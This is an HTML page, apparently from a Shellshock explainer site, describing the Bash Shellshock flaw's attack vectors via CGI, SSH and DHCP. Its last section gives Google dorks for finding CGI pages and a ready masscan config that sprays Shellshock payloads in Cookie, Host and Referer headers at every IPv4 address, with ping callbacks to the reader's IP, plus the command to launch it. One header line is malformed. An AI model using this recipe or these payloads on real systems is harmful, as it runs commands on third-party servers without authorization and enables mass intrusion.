<!DOCTYPE html>
<html lang="en-US">

<head>

	<h2 class="offscreen">ShellShockable</h2> 
	<div id="hmenu"> 
	<ul> 
	  <li><a href="index.php">Home</a></li> 
	  <li><a href="more.php">More Info</a></li> 
	  <li><a href="about.php">About</a></li> 
	  <li><a href="update.php">Updates</a></li> 
	  <li><a href="explain.php">Simpler Explanation</a></li>
	  <li><a href="attacks.php">Attack Vectors</a></li> 

	</ul>   
	</div> 
	


	<div align="center">
	<h1>Shellshock Attack Vectors</h1>
	</div>
	<!-- Meta Tags -->
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

	<title>ShellShock Vulnerability Scanner</title>   

	<meta name="description" content="Unknown Error" /> 
	<link href='https://fonts.googleapis.com/css?family=Titillium+Web:400,200,200italic,300,300italic,400italic,600,600italic,700,700italic,900' rel='stylesheet' type='text/css'>
	<link rel="shortcut icon" href="/favicon.ico">

	<link href="/css/bootstrap.min.css" rel="stylesheet">
	<link href="/css/customx.css" rel="stylesheet" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script src="/js/bootstrap.min.js"></script>
	
	</head>
	<body>
	<p>
	<div style="padding-top:25px; padding-left:300px; padding-right:300px; padding-bottom:30px; " align="left">
	<br>

	<h3>HTTP Attack Vectors</h3>
	<ol>
		<ul>The HTTP attack vector for Shellshock is through websites using CGI. In case you didn't already know CGI stands for Common Gateway Interface and is a method of creating a dynamic websites. As its name would suggest CGI creates an interface between the web server and web applications. So this means if exploited the user will have access to the web server.<br>
		For example an attacker crafts a malicious command to be sent to a website using CGI. As we know the vulnerability has to do with a flaw in Bash's parsing of trailing strings, so an innocuous looking command could be sent to the website and would be processed by the server and in doing so potentially compromising the server. Generally speaking authentication is not neccessary for this attack method.</ul>
	</ol>

	<h3>SSH Attack Vectors</h3>
	<ol>
		<ul>On the other hand, exploiting SSH with Shellshock does require authentication and should therefore be classified as a privilege escalation vulnerability. In order to use Bash remotely with SSH the user must have authenticated. And if the user has authenticated then they already have access to the system and therefore the Shellshock does them no good. The only time this is a vulnerability in Bash is if an SSH server has users with restricted access. So using the Shellshock vulnerability the user would be able to elevate his priveleges.
		</ul>
	</ol>
	<h3>DHCP Attack Vectors</h3>
	<ol>
		<ul>The main method of attack via DHCP is done by creating a malicious DHCP server. The DHCP client will save variables given to it by the server as environmental variables and it does so using Bash, therefore leaving the system at risk. </ul>
	</ol>
	
		
	<h3>Mass searching for vulnerable machines</h3>
	<ol>
		<ul><h4>Google Dorks</h4>There a few main ways you can search for vulnerable servers. The first method we will look at using is google dorks. In a nutshell google dorks is simply manipulating googles advanced search features to find a much more targeted group of machines. You must simply come up with a query of what you want to find and google it. These two dorks are for finding sites that are potentially vulnerable by searching google for sites specifically that have a ".cgi" extension: <br>
		<code>inurl:.cgi</code> <br>
		<code>inurl:/dana-na/auth/url_default/welcome.cgi</code><br>
		<h4>Using Masscan for Shellshock</h4>
		This is assuming you have already installed Masscan.
		<br> Make a file called shellshockscan.conf and save with this:
		<pre><code>			target-ip = 0.0.0.0/0
			port = 80
			banners = true
			http-user-agent = shellshock-scan
			http-header = Cookie:() { :; }; ping -c [IP HERE]
			http-header = Host:() { :; }; ping -c 3 [IP HERE]
			http-header = Referer:() { :; }; ping -c 3 [IP HERE]</code></pre>

		Obviously replace [IP Here] with your external IP address.<br>
		Then go to where Masscan is installed and run:<br>
		<code>masscan -c shellshockscan.conf</code>
		Note: You may get told to exclude at least 1 IP, just put 255.255.255.255

		</ul>
	</ol>
	
	


	</p>
	

	</p>
	</div>
	</body>